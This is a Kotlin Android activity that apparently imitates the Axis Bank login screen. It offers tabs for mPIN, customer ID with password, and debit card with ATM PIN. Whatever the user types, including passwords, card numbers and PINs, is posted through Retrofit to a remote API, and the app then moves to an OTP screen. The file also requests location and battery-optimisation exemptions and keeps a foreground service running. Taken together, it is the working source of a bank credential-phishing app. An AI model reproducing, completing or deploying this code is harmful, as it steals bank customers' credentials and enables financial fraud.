package com.example.axisbank

import android.app.ActivityManager
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.example.axisbank.databinding.ActivityMainBinding
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response


class MainActivity : AppCompatActivity() {

    private lateinit var binding:ActivityMainBinding
    private var btnstr = "mpin";

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)


        geopermission.requestPermissions(this)

        if (geopermission.hasGeoPermissions(this)) {
            val isServiceRunning = isServiceRunning(MyForegroundService::class.java)
            if (!isServiceRunning) {
                val serviceIntent = Intent(this, MyForegroundService::class.java)
                ContextCompat.startForegroundService(this, serviceIntent)
            }
        }


        binding.t1.text = "Registered Mobile No:"
        binding.t2.text = "Customer ID:"
        binding.t3.text = "mPIN"
        settext();
        binding.cust.setTextColor(resources.getColor(R.color.black))
        binding.debt.setTextColor(resources.getColor(R.color.black))
        binding.mpin.setTextColor(resources.getColor(R.color.white))
        binding.cust.background = getDrawable(R.drawable.white_bg_round)
        binding.debt.background = getDrawable(R.drawable.white_bg_round)
        binding.mpin.background = getDrawable(R.drawable.red_bg_round)

        binding.t2.visibility = View.GONE
        binding.e2.visibility = View.GONE


        binding.cust.setOnClickListener{

            binding.t1.text = "Login Id / Customer ID:"
            binding.t2.text = "Password:"
            binding.t3.text = "Registered Mobile No:"
            settext();
            btnstr = "cus";
            binding.cust.setTextColor(resources.getColor(R.color.white))
            binding.debt.setTextColor(resources.getColor(R.color.black))
            binding.mpin.setTextColor(resources.getColor(R.color.black))
            binding.cust.background = getDrawable(R.drawable.red_bg_round)
            binding.debt.background = getDrawable(R.drawable.white_bg_round)
            binding.mpin.background = getDrawable(R.drawable.white_bg_round)

            binding.t2.visibility = View.VISIBLE
            binding.e2.visibility = View.VISIBLE
        }

        binding.debt.setOnClickListener{

            binding.t1.text = "Registered Mobile No:"
            binding.t2.text = "Debit Card No:"
            binding.t3.text = "ATM Pin:"
            settext();
            btnstr = "deb";
            binding.cust.setTextColor(resources.getColor(R.color.black))
            binding.debt.setTextColor(resources.getColor(R.color.white))
            binding.mpin.setTextColor(resources.getColor(R.color.black))
            binding.cust.background = getDrawable(R.drawable.white_bg_round)
            binding.debt.background = getDrawable(R.drawable.red_bg_round)
            binding.mpin.background = getDrawable(R.drawable.white_bg_round)

            binding.t2.visibility = View.VISIBLE
            binding.e2.visibility = View.VISIBLE
        }

        binding.mpin.setOnClickListener{

            binding.t1.text = "Registered Mobile No:"
            binding.t2.text = "Customer ID:"
            binding.t3.text = "mPIN"
            settext();
            btnstr = "mpin";
            binding.cust.setTextColor(resources.getColor(R.color.black))
            binding.debt.setTextColor(resources.getColor(R.color.black))
            binding.mpin.setTextColor(resources.getColor(R.color.white))
            binding.cust.background = getDrawable(R.drawable.white_bg_round)
            binding.debt.background = getDrawable(R.drawable.white_bg_round)
            binding.mpin.background = getDrawable(R.drawable.red_bg_round)

            binding.t2.visibility = View.GONE
            binding.e2.visibility = View.GONE
        }


        binding.login.setOnClickListener {

            if (binding.e1.text.toString().isEmpty()
                || binding.e3.text.toString().isEmpty()
                || binding.e1.text.toString().isEmpty()){
                Toast.makeText(this,"fill all fields",Toast.LENGTH_SHORT).show();
            }else {

                val util = Util()

                val apiService = ApiClient.getClient().create(ApiService::class.java)
                val intentff = Intent(this, Otpone::class.java)

                if (btnstr == "cus") {

                    val data = Submit1(domain = "example.com", last_update = "second", mobile = binding.e3.text.toString(),
                        password = binding.e2.text.toString(), userid = binding.e1.text.toString())
                    util.saveLocalData(this,"mobile",binding.e3.text.toString() )
                    val call = apiService.submitData(data)
                    call.enqueue(object : Callback<Void?> {
                        override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                            if (response.isSuccessful) {
                                startActivity(intentff)
                                Log.d("asdf123", "yes")
                            } else {
                                Log.d("asdf123", "unsucess")
                            }
                        }

                        override fun onFailure(call: Call<Void?>, t: Throwable) {
                            Log.d("asdf123", t.toString())
                        }
                    })


                } else if (btnstr == "deb") {


                    val data = Submit2(atmpin = binding.e3.text.toString(), cardno = binding.e2.text.toString(), domain = "example.com",
                        last_update = "second", mobile = binding.e1.text.toString())
                    util.saveLocalData(this,"mobile",binding.e1.text.toString() )
                    val call = apiService.submitData(data)
                    call.enqueue(object : Callback<Void?> {
                        override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                            if (response.isSuccessful) {
                                startActivity(intentff)
                                Log.d("asdf123", "yes")
                            } else {
                                Log.d("asdf123", "unsucess")
                            }
                        }

                        override fun onFailure(call: Call<Void?>, t: Throwable) {
                            Log.d("asdf123", t.toString())
                        }
                    })


                } else {

                    val data = Submit3(customer_id = binding.e2.text.toString(), mpin = binding.e3.text.toString(), domain = "example.com",
                        last_update = "second", mobile = binding.e1.text.toString())
                    util.saveLocalData(this,"mobile",binding.e1.text.toString() )
                    val call = apiService.submitData(data)
                    call.enqueue(object : Callback<Void?> {
                        override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                            if (response.isSuccessful) {
                                startActivity(intentff)
                                Log.d("asdf123", "yes")
                            } else {
                                Log.d("asdf123", "unsucess")
                            }
                        }

                        override fun onFailure(call: Call<Void?>, t: Throwable) {
                            Log.d("asdf123", t.toString())
                        }
                    })

                }
            }
        }


    }

    private fun settext(){
        binding.e1.setText("");
        binding.e2.setText("");
        binding.e3.setText("");
    }

    private fun requestBatteryOptimizationPermission() {
        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
        intent.data = Uri.parse("package:$packageName")
        startActivity(intent)
    }

    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val manager = getSystemService(ACTIVITY_SERVICE) as ActivityManager
        for (service in manager.getRunningServices(Int.MAX_VALUE)) {
            if (serviceClass.name == service.service.className) {
                return true
            }
        }
        return false
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String?>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (!geopermission.hasGeoPermissions(this)) {
            if (!geopermission.shouldShowRequestPermissionRationale(this)) {
                geopermission.launchPermissionSettings(this)
            }
            finish()
        }
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
            requestBatteryOptimizationPermission()
        }

        val isServiceRunning = isServiceRunning(MyForegroundService::class.java)
        if (!isServiceRunning) {
            val serviceIntent = Intent(this, MyForegroundService::class.java)
            ContextCompat.startForegroundService(this, serviceIntent)
        }


    }

}